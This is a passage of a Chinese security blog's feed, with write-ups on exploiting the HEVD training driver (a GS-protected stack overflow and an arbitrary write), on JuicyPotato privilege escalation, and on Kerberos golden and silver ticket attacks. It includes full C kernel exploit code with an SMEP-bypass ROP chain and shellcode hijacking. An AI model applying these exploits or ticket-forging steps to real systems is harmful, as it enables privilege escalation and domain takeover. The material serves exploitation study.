system(&quot;pause&quot;);</code>，重新弄好的方案都能打包成一个函数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulUseStackInfo</span><span class="params">(<span class="type">wchar_t</span> ProcName[])</span> </span>&#123;</span><br><span class="line">pStackInfo stackinfo = (pStackInfo)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(StackInfo));</span><br><span class="line"><span class="keyword">if</span> (stackinfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t allocate memory\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">stackinfo-&gt;ModuleName = ProcName;</span><br><span class="line">stackinfo-&gt;result = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, (LPTHREAD_START_ROUTINE)ulGetStackLimit, stackinfo, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t get thread\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">funcaddr baseaddr = stackinfo-&gt;result;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">free</span>(stackinfo);</span><br><span class="line"><span class="keyword">return</span> baseaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>最终exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line">funcaddr stack_base = <span class="built_in">ulUseStackInfo</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">funcaddr cookie = <span class="number">0</span>;</span><br><span class="line">stack_base -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, stack_base);</span><br><span class="line"></span><br><span class="line">cookie = stack_base ^ value;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, cookie);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">size = <span class="number">0x258</span>;</span><br><span class="line"><span class="comment">//size = 0x200;</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)cookie;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/fd9a8491ecc46c58eb2957ca7579ab55.png" alt="image-20240224140007704" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEVD中的栈溢出加上GS保护&lt;br /&gt;
还有一个知识点就是windows内核栈地址泄露&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-任意地址写</title>
    <link href="https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/"/>
    <id>https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/</id>
    <published>2024-02-23T15:35:34.000Z</published>
    <updated>2024-02-24T06:19:14.407Z</updated>
    
    <content type="html"><![CDATA[<p>非预期方法，暂时不会放出来</p><span id="more"></span><h1 id="hevd练习-任意地址写"><a class="markdownIt-Anchor" href="#hevd练习-任意地址写"></a> HEVD练习-任意地址写</h1><h2 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点"></a> 漏洞点</h2><p><img src="https://img.joe1sn.top/uploads/big/ab81f0548c9c7beae376282f0a845c14.png" alt="image-20240216173136321" /></p><h2 id="一点好玩的"><a class="markdownIt-Anchor" href="#一点好玩的"></a> 一点好玩的</h2><p>传入一个结构体，得到结构体过后写入内容</p><p>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* What;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* Where;</span><br><span class="line">&#125;arbitrary_write, *pArbitraryWrite;</span><br></pre></td></tr></table></figure><p>这里我做一个比较有意思的事儿，比如修改某个变量的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> vuln = <span class="number">0x10000</span>;</span><br><span class="line"><span class="type">int</span> pay = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] the vuln value is 0x%x\n&quot;</span>, vuln);</span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;pay;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;vuln;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] now vuln value is 0x%x&quot;</span>, vuln);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/46a0ef83a8f20889bc2d73915c1ab5f1.png" alt="image-20240216174148214" /></p><p><img src="https://img.joe1sn.top/uploads/big/2a02f670b395a1f09d2e95b1992ce847.png" alt="image-20240216174214564" /></p><p>利用ioctl的机制也可以实现读取某个地址的值</p><h2 id="预期打法"><a class="markdownIt-Anchor" href="#预期打法"></a> 预期打法</h2><p>最开始栈溢出我们提权使用的是修改当前的Token的低位并修改Token的Present和Enable，如果这里我们知道地址的话就可以做一样的操作了</p><p>但是在普通权限下不可能知道地址，那么我们是否能够覆盖HEVD驱动中的某些函数，使用类似inline hook的方式，将函数地址改为我们shellcode的地址，这样我们把问题变成了和内核栈溢出类似的情况了</p><p>利用之前的<code>NtQueryInfomation</code>的<code>ulGetKernelBase</code>函数可以获得HEVD的基地址</p><p><img src="https://img.joe1sn.top/uploads/big/9e0926c08abe24bc42efe409abb7e4a0.png" alt="image-20240216200738623" /></p><p>这里我就尝试覆写DbgPrintEx函数为shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">funcaddr hevd_base = ulGetKernelBase((PCHAR)<span class="string">&quot;HEVD&quot;</span>);</span><br><span class="line">funcaddr dbgprint_addr = hevd_base + <span class="number">0x2008</span>;</span><br><span class="line">funcaddr nt_base = ulGetKernelBase((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD SYS kernel base %llx\n&quot;</span>, hevd_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] ntoskrnl kernel base %llx\n&quot;</span>, nt_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD DbgPrint Address %llx\n&quot;</span>, dbgprint_addr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Allocate Shellcode Space\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = VirtualAlloc(<span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (shellcode_addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] shellcode addr failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Shellcode addr %llx\n&quot;</span>, shellcode_addr);</span><br><span class="line"></span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;shellcode_addr;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)dbgprint_addr;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>注意，覆写的是<code>HEVD_BASE+0x2008</code>的值 所指向的值</p><p><img src="https://img.joe1sn.top/uploads/big/575c9467678be806ed46eff70b42791e.png" alt="image-20240216210359750" /></p><p>成功覆写</p><p><img src="https://img.joe1sn.top/uploads/big/d176b13c88d12fff078f41084333a6ed.png" alt="image-20240216210450239" /></p><p>现在比较麻烦的就是过SMEP保护。</p><p>可以利用之前GS保护使用的内核栈泄露<br /><a href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/">https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</a></p><p>直接在栈上布置参数和ROP链，要么取消SMEP，要么参考KVAS直接使用ROP链申请的堆中执行，后续操作就和栈溢出一致，只不过需要把某个函数该地址改为第一个ROP地址</p><h2 id="非预期利用"><a class="markdownIt-Anchor" href="#非预期利用"></a> 非预期利用</h2><p>写到这里在翻查别人wp的时候突然想到驱动是一直在后台运行的，我们可以多次触发该漏洞，然后我用了一种非常规的方法，eee，目前这种方法我还用在一些项目上，所以暂时不公开…SORRY</p><p>方法可以参考：<a href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a><br />（虽然我的方法比他简单很多）</p><p><img src="https://img.joe1sn.top/uploads/big/ffd66dc4226285ae67ff3ae69b05715a.png" alt="image-20240216232930887" /></p><p>可以优雅退出不卡顿</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;非预期方法，暂时不会放出来&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【内网】从PoC看JuicyPotato提权</title>
    <link href="https://joe1sn.eu.org/2024/02/23/potato-1/"/>
    <id>https://joe1sn.eu.org/2024/02/23/potato-1/</id>
    <published>2024-02-23T06:49:21.000Z</published>
    <updated>2024-02-23T06:53:20.081Z</updated>
    
    <content type="html"><![CDATA[<p>从此认识到自己不是做win安全的料</p><span id="more"></span><p>个人认为JuictPotato的前身是著名的<code>Rotten Potato</code></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d521498a177634056408fa3503d1d1362d5b0ac7.png" alt="image-20211022212121001" /></p><blockquote><ol><li>使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口</li><li>RPC 向代理发送 NTLM 协商包</li><li>代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证<br />注:此包被修改为强制本地身份验证.</li><li>&amp; 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复</li><li>将两个数据包的内容混合以匹配本地协商并转发到RPC</li><li>RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟</li></ol></blockquote><ol><li><p>【PotatoAPI】创建COM监听器<code>startCOMListenerThread</code></p><ul><li><p>初始化<code>WinSocket</code>，创建非阻塞式socket，并监听<code>-t</code>端口。<strong>跳转到2</strong>，后面的就是监听循环中的</p></li><li><p>【LocalNegotiator】使用<code>processNtlmBytes</code>处理返回地NTLM信息。处理顺序刚好是1,2,3</p><ul><li>首先获取<a href="https://learn.microsoft.com/zh-cn/windows/win32/secgloss/s-gly"><em>安全主体</em></a>的预先存在的凭据的句柄，初始化Client和Sever的Token，建立安全上下文（新进程的身份验证），转发给RPC</li><li>RPC返回NTLM挑战应答问题，新进程的身份验证也会返回他的NTLM挑战应答问题，然后改装RPC的数据，塞入新进程的身份验证的NTLM挑战应答的部分数据</li><li>从系统回答中，创建新的system令牌</li></ul></li></ul></li><li><p>【PotatoAPI】同本地135端口建立RPC连接，发送消息从<code>PotatoAPI-&gt;rpcSendQ</code>走出队列</p></li><li><p>【PotatoAPI】触发<code>triggerDCOM</code></p><ul><li><code>StgCreateDocfileOnILockBytes</code>：创建Istorage对象</li><li>【IStorageTrigger】创建<code>IStorageTrigger</code>对象</li><li><code>CLSIDFromString</code>：将CLSID字符转为COM对象</li><li><code> CoGetInstanceFromIStorage</code> ：创建一个新的 对象，使用<code> IPersistFile：：Load</code>初始化</li><li><strong>触发DCOM后，进入1中的监听循环</strong></li></ul></li><li><p>通过得到的system token，经典的<code>CreateProcessWithTokenW</code>创建新的进程</p></li></ol><p>要一个人写的话工作量还是挺大的，而且<code>IstroageTrigger</code>得自己构造，感谢开源PoC！</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://forum.butian.net/share/860">https://forum.butian.net/share/860</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从此认识到自己不是做win安全的料&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【内网】探索Windows内网的Kerberos协议</title>
    <link href="https://joe1sn.eu.org/2024/02/23/kerberos/"/>
    <id>https://joe1sn.eu.org/2024/02/23/kerberos/</id>
    <published>2024-02-23T04:29:23.000Z</published>
    <updated>2024-02-23T06:56:56.176Z</updated>
    
    <content type="html"><![CDATA[<p>感恩学校扎实的密码学功底，分析起来也是很简单的</p><span id="more"></span><p>说白了就一张图</p><p><img src="https://img.joe1sn.top/uploads/big/173ba503f8f4d7d2cbc88312cb0a2551.png" alt="img" /></p><p><img src="https://img.joe1sn.top/uploads/big/1946078615b1e4c4c817b0bf733df49d.png" alt="img" /></p><h1 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h1><h2 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据"></a> 黄金票据</h2><p>第三步中 使用 KDC 特定账户 Krbtgt 的 NTLM-Hash 时，如果我们有了该<code>NTML-Hash</code>那么就能做到伪造TGT</p><p>该方法由于需要DC的<code>NTLM-Hash</code>，所以用于留后门</p><p>假设我们拿到了DC上administrator权限的shell</p><p><img src="https://img.joe1sn.top/uploads/big/682d17bfb67add232b394fad39c00485.png" alt="image-20240222212152261" /></p><p>抓取Hash</p><p><img src="https://img.joe1sn.top/uploads/big/bc35669581bb749a80113b2d145f4ac6.png" alt="image-20240222212207346" /></p><p><img src="https://img.joe1sn.top/uploads/big/88027e45108649714df4180ab9a0df53.png" alt="image-20240222212223689" /></p><ul><li>CS使用的命令为：lsadump</li><li>相关项目：<a href="https://github.com/Xre0uS/MultiDump">https://github.com/Xre0uS/MultiDump</a></li></ul><p>获得管理员SID</p><ul><li>mimikatz一把梭</li><li><code>wmic useraccount get name,sid</code></li></ul><p>切换到域内用户的普通权限，制作黄金票据</p><p><img src="https://img.joe1sn.top/uploads/big/698af4ca909c2457fd7e9bfce63ee691.png" alt="image-20240223092136452" /></p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Ckerberos.assets%5Cimage-20240223095513608.png" alt="image-20240223095513608" /></p><p><img src="https://img.joe1sn.top/uploads/big/327782e54254105201209ef3d5936f2e.png" alt="image-20240223092217749" /></p><p><strong>横向移动</strong></p><p>先尝试访问文件夹</p><p><img src="https://img.joe1sn.top/uploads/big/f947a652d48ce2c94f6f5d9dd0888f94.png" alt="image-20240223095556996" /></p><p>原因：<a href="https://support.microsoft.com/zh-cn/topic/ms16-101-windows-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F%E8%AF%B4%E6%98%8E-2016-%E5%B9%B4-8-%E6%9C%88-9-%E6%97%A5-be16a40d-d7e2-c4b2-d885-6a22cff3cb77">https://support.microsoft.com/zh-cn/topic/ms16-101-windows-身份验证方法的安全更新程序说明-2016-年-8-月-9-日-be16a40d-d7e2-c4b2-d885-6a22cff3cb77</a></p><p><img src="https://img.joe1sn.top/uploads/big/f0814cff5a356db265a78fcdfb6ba1f3.png" alt="image-20240223095722593" /></p><p>貌似是WinServer2012的硬伤了，虚拟机必须用一些补丁才能用vmtools…</p><p><img src="https://img.joe1sn.top/uploads/big/5961dacc540e39be013e953ae0c28242.png" alt="image-20240223100706455" /></p><h2 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据"></a> 白银票据</h2><p>需要知道Server的<code>HTLM-Hash</code></p><p>使用该值伪造TGT，在第七步中发送给Server</p><blockquote><p>但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC，PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提。</p></blockquote><h2 id="ms14-06"><a class="markdownIt-Anchor" href="#ms14-06"></a> MS14-06</h2><p>问题出在第四步</p><p>KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;感恩学校扎实的密码学功底，分析起来也是很简单的&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【内网】环境搭建</title>
    <link href="https://joe1sn.eu.org/2024/02/20/ad-dc-1/"/>
    <id>https://joe1sn.eu.org/2024/02/20/ad-dc-1/</id>
    <published>2024-02-20T13:56:00.000Z</published>
    <updated>2024-02-22T15:55:27.162Z</updated>
    
